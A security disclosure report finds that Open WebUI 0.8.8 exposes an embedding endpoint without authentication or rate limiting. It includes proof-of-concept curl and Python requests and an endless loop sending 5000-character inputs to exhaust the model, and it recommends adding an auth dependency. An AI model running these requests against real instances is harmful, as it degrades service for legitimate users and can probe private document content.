# Open WebUI — Unauthenticated Embedding Endpoint Abuse

**Target:** [open-webui/open-webui](https://github.com/open-webui/open-webui)
**Version tested:** 0.8.8
**Date:** March 2026
**Severity:** Medium (CVSS 5.3)
**Status:** Original finding — no matching report on huntr as of 2026-03-21

---

## Summary

The endpoint `GET /api/v1/retrieval/ef/{text}` processes text through the configured embedding model and returns a vector without requiring any authentication. There is no rate limiting and no input size enforcement. Any unauthenticated user with network access to the Open WebUI instance can invoke the embedding model indefinitely.

---

## Affected Endpoint

```
GET /api/v1/retrieval/ef/{text}
```

**Response (200, no credentials):**
```json
{
  "result": [-0.062, 0.054, 0.052, 0.085, ...]
}
```

Vector dimensions: **384** (default sentence-transformers model).

---

## Reproduction

No setup needed — works against any Open WebUI instance:

```bash
# No credentials required
curl http://TARGET:3000/api/v1/retrieval/ef/hello
# → {"result": [...384 floats...]}

# No rate limiting — 20 requests in 0.42s, all succeed
for i in $(seq 1 20); do
  curl -s http://TARGET:3000/api/v1/retrieval/ef/test$i > /dev/null && echo "OK $i"
done
```

```python
import requests

# Runs embedding model without any authentication
r = requests.get("http://TARGET:3000/api/v1/retrieval/ef/hello")
assert r.status_code == 200           # no auth needed
assert len(r.json()["result"]) == 384 # full vector returned
```

---

## Test Results

| Test | Result |
|------|--------|
| No credentials | ✅ 200 OK |
| 20 rapid requests | ✅ All succeed (0.42s) |
| Input 100 chars | ✅ 200 OK |
| Input 1000 chars | ✅ 200 OK |
| Input 5000 chars | ✅ 200 OK |
| Rate limiting | ❌ None |
| Auth required | ❌ None |
| Same response as authenticated | ✅ Identical |

---

## Impact

**1. Resource abuse (primary)**
Open WebUI is commonly deployed with GPU-accelerated embedding models (e.g. via Ollama). An unauthenticated attacker can run sustained embedding workloads at no cost to themselves:

```python
# Continuous embedding abuse — no credentials, no rate limit
while True:
    requests.get("http://TARGET:3000/api/v1/retrieval/ef/" + "A" * 5000)
```

This saturates the embedding model, degrading RAG performance for legitimate users.

**2. Information inference**
The embedding vectors are deterministic and model-specific. An attacker can use the unauthenticated endpoint to:
- Fingerprint the exact embedding model in use
- Perform membership inference against the RAG knowledge base
- Compute semantic similarity probes against private document content

**3. Exposure surface**
Open WebUI instances exposed on a LAN or via `0.0.0.0` binding (common for team deployments) are affected without any user interaction.

---

## Root Cause

The endpoint is registered without a security dependency in the FastAPI router. All other `/api/v1/retrieval/` endpoints require authentication — this one does not.

Likely a missing `Depends(get_verified_user)` in `backend/open_webui/routers/retrieval.py`.

---

## Fix Recommendation

```python
# Add authentication dependency
@router.get("/ef/{text}")
async def get_embedding(text: str, user=Depends(get_verified_user)):
    ...
```

Additionally: add rate limiting via `slowapi` or similar.

---

## Environment

- **OS:** macOS Darwin 25.3.0 (Apple M4)
- **Open WebUI:** 0.8.8 (pip install)
- **Test account:** local admin (no personal data used in testing)
- **Network:** localhost only

---

## Tools

| File | Description |
|------|-------------|
| `api_recon.py` | Full API surface enumeration (386 endpoints) |
| `security_tester.py` | IDOR, XSS, file upload, SSRF tests |
| `embedding_noauth_tester.py` | Embedding endpoint abuse PoC |
| `embedding_noauth_results.json` | Raw test results |
